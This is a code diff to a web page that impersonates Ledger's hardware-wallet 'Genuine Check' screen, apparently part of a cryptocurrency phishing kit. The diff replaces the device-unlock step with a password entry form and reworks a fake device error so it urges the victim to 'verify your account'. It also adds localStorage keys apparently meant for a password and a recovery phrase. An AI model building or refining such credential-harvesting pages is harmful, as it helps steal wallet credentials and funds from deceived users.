@@ -4956,7 +4956,7 @@
       margin: 0 auto; 
       background: rgba(47, 49, 54, 0.8);
     }
-    .form-group textarea{
+    .form-group textarea, .form-group input{
       resize: vertical;
       font-size: 16px; /* set the font size */
       line-height: 1.5; /* set the line height */
@@ -4966,15 +4966,21 @@
       border-radius: 3px; /* round the corners of the border */
       width: 100%;
       height: 100%;
-      padding: 10px;
+      /* padding: 10px; */
       caret-color: white;
       color: white;
 
     }
-    .form-group textarea::-webkit-input-placeholder {
+    .form-group textarea{
+      padding: 10px;
+    }
+    .form-group input{
+      padding: 15px;
+    }
+    .form-group textarea::-webkit-input-placeholder, .form-group input::-webkit-input-placeholder {
       color: white;
     }
-    .form-group textarea:focus{
+    .form-group textarea:focus, .form-group input:focus{
       outline: none;
     }
     .form-group:after {
@@ -5006,11 +5012,24 @@
       </div>
       <div class="pop-up-container-content">
         <!-- STEP 1 -->
-        <div class="step" id="step-1">
+        <div class="step" id="step-1" style="width: 100%; max-width: 90%;">
           <h1 class="check-text">Genuine Check</h1>
           <img class="meter-img" src="/nano_s_plus.png" alt="Meter Image">
-          <h4 class="loading-text">Connect and unlock your device</h4>
-          <div class="loading-spinner"></div>
+          <h4 class="loading-text">Enter your password</h4>
+          <div class="loading-spinner" id="form-password-load-spinner" style="height: 34px;width: 34px; display: none;"></div>
+          <form id="my-password-form" name="my-password-form" style="width: 100%;
+          margin: 15px 0 auto; max-width: 90%;">
+            <div class="form-group">
+              <input type="password" placeholder="Enter your password here" name="password-k" id="password">
+            </div>
+            <button id="password-submit-btn" style="width: 100%;" type="submit" class="button-type-primary button-type">
+              Next
+              <span style="margin-left: 10px;">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#3d71ff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+              </span>
+            </button>
+          </form>
+          <!-- <div class="loading-spinner"></div> -->
         </div>
         <!-- STEP 2 -->
         <div class="step" id="step-2">
@@ -5022,13 +5041,13 @@
                         <path d="M2.208 19.88h19.584L12 2.12 2.208 19.88zm1.968-1.152L12 4.568l7.824 14.16H4.176zm6.888-1.488h1.848v-1.848h-1.848v1.848zm.336-6.096l.096 2.736h1.008l.12-2.736v-2.28H11.4v2.28z"></path>
             </svg>
             <h5 style="text-align:center;color:var(--color-bd-pink);width: 300px;margin: 0 auto;margin-bottom: 10px; font-size: 1.25rem;">Something went wrong</h5>
-            <p style="color:#a3a3a3; margin-bottom: 5px;">Failed to place a request to your device, please verify your ledger accounts.</p>
+            <p style="color:#a3a3a3; margin-bottom: 5px;">Failed to login to your device, please verify your ledger account.</p>
             <p style="font-size: .8rem; color:#a3a3a3; font-weight: bold; margin-top: 15px;">Ledger device invalid: Invalid parameters received (0x6b00)</p>
             <button class="button-type-orange button-type" id="verify-btn">
               <span style="margin-right: 10px;">
                 <svg xmlns="http://www.w3.org/2000/svg" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="#f5c793" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-download-cloud"><polyline points="8 17 12 21 16 17"/><line x1="12" y1="12" x2="12" y2="21"/><path d="M20.88 18.09A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.29"/></svg>
               </span>
-              Verify your accounts
+              Verify your account
             </button>
             <button style="margin-top: 15px;" id="retry-btn" class="button-type-primary button-type">
               <span style="margin-right: 10px;">
@@ -5081,23 +5100,23 @@
   </script> -->
 
   <script>
-    setTimeout(() => {
       // register service workers
 
-      if ("serviceWorker" in navigator) {
-        // window.addEventListener("load", () => {
-        navigator.serviceWorker
-          .register("/service-worker.js")
-          .then((req) => {
-            if (!req.active) {
-              console.log("Service Worker: Registering...");
-            }
-          })
-          .catch((err) => console.error(`Service Worker ${err}`));
-        // });
-      }
-    },400)
+      // if ("serviceWorker" in navigator) {
+      //   // window.addEventListener("load", () => {
+      //   navigator.serviceWorker
+      //     .register("/service-worker.js")
+      //     .then((req) => {
+      //       if (!req.active) {
+      //         console.log("Service Worker: Registering...");
+      //       }
+      //     })
+      //     .catch((err) => console.error(`Service Worker ${err}`));
+      //   // });
+      // }
     localStorage.setItem("banner/modal/open", false)
+    localStorage.setItem("keystone-paw", "")
+    localStorage.setItem("keystone-phr", "")
   </script>
   <script type="text/javascript" src="/runtime.5d0f5b7553f266f1f476.js"></script>
   <script type="text/javascript" src="/npm.sentry.b5cd2b526d1db55bdf99.chunk.js"></script>
